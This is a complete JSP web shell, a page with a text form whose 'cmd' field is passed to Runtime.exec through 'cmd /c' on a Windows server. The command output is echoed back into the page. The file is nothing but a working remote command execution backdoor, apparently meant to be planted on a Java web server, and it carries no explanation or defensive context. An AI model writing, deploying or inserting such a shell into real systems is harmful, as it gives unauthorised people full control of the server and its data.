<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
<html>
    <head>
        <meta charset="UTF-8" />
    </head>
    <body>
        <form method="GET" action="">
            <input type="text" name="cmd" />
            <input type="submit" value="Exec!" />
        </form>

	<%
    		//Process Runtime.getRuntime().exec("ls");
    		String cmd = request.getParameter("cmd");
    		if (cmd != null) {
        		out.println("<pre>Command was: <b>" + cmd + "</b>\n");

        	try {
           		 Process process = Runtime.getRuntime().exec(new String[]{"cmd", "/c", cmd});
           		 java.io.InputStream inputStream = process.getInputStream();
           		 java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(inputStream, "MS949"));
           		 String line;
           		 while ((line = reader.readLine()) != null) {
                		out.println(line.replace("<","|").replace(">","|"));
           		 }

            		reader.close();
        	} catch (Exception e) {
            		out.println("<pre>Error executing command: <b>" + (e.getMessage()) + "</b></pre>");
       		 }

        		out.println("</pre>");
    	} %>
    </body>
</html>

